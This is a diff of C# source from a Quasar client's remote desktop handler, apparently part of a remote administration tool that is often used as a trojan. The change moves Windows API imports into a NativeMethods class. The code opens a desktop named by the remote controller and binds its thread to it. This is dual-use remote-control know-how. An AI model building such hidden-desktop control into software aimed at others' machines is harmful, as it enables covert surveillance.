@@ -1,46 +1,21 @@
-﻿using Quasar.Client.Helper;
+﻿using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Windows.Forms;
+using Quasar.Client.Helper;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 using Quasar.Common.Video;
 using Quasar.Common.Video.Codecs;
-using System;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.IO;
-using System.Windows.Forms;
-
-using InputInterceptorNS;
 using Quasar.Client.Interception;
-using System.Runtime.InteropServices;
-using System.Security.AccessControl;
-using NAudio.Utils;
-using Quasar.Client.Networking;
+using Quasar.Client.Utilities;
 
 namespace Quasar.Client.Messages
 {
     public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
     {
-
-
-        // Import the necessary functions from user32.dll
-
-
-        [DllImport("user32.dll")]
-        private static extern bool CloseDesktop(IntPtr hDesktop);
-
-        [DllImport("user32.dll")]
-        private static extern bool SetThreadDesktop(IntPtr hDesktop);
-
-        [DllImport("user32.dll")]
-        private static extern IntPtr GetThreadDesktop(uint dwThreadId);
-
-        [DllImport("kernel32.dll")]
-        private static extern uint GetCurrentThreadId();
-
-        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        public static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);
-
         private const uint DESKTOP_READOBJECTS = 0x0001;
         private const uint GENERIC_ALL = 0x10000000;
 
@@ -81,9 +56,9 @@ namespace Quasar.Client.Messages
                 {
                     if (clientRef.curDesktop.ToInt64() != 0L)
                     {
-                        CloseDesktop(clientRef.curDesktop);
+                        NativeMethods.CloseDesktop(clientRef.curDesktop);
                     }
-                    IntPtr hDesktop = OpenDesktop(message.DesktopName, 0U, false, GENERIC_ALL);
+                    IntPtr hDesktop = NativeMethods.OpenDesktop(message.DesktopName, 0U, false, GENERIC_ALL);
                     if (hDesktop != IntPtr.Zero)
                     {
                         clientRef.curDesktop = hDesktop;
@@ -92,7 +67,7 @@ namespace Quasar.Client.Messages
                     }
                     else return;
                 }
-                if(clientRef.curDesktop != IntPtr.Zero) SetThreadDesktop(clientRef.curDesktop);
+                if (clientRef.curDesktop != IntPtr.Zero) NativeMethods.SetThreadDesktop(clientRef.curDesktop);
             }
             catch (Exception ex)
             {
